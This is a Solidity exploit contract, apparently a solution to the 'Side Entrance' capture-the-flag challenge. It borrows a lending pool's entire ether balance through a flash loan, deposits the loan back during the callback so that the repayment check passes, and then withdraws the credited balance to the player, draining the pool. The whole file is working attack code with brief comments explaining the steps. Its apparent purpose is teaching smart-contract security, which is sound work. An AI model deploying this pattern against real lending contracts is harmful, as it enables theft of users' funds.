// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "solady/src/utils/SafeTransferLib.sol";

contract IFlashLoanEtherReceiver {

    address payable sideEntrance;
    address payable player;
    uint256 amount;

    constructor(address _sideEntrance, address payable _player) {
        sideEntrance = payable(_sideEntrance);
        player = _player;
        amount = sideEntrance.balance;
    }

    // calling the Loan function enables the trigger of out execute function which will deposit
    // the ETHs that the pool is sending us. After the player withdraw all the money.
    function callLoan() external returns(bool success) {
        (success, ) = sideEntrance.call(
            abi.encodeWithSignature("flashLoan(uint256)", amount)
        );
        require(success, "Loan failed");
    }

    function withdraw() public {
        require(msg.sender == player, "Not the player");
        // deposit
        (bool success, ) = sideEntrance.call(
            abi.encodeWithSignature("withdraw()")
        );
        require(success, "withdraw failed");
        player.transfer(amount);
    }

    function execute() external payable returns(bool success) {
        // deposit
        (success, ) = sideEntrance.call{value: amount}(
            abi.encodeWithSignature("deposit()")
        );
        require(success, "deposit failed");
    }

    receive() external payable {}
}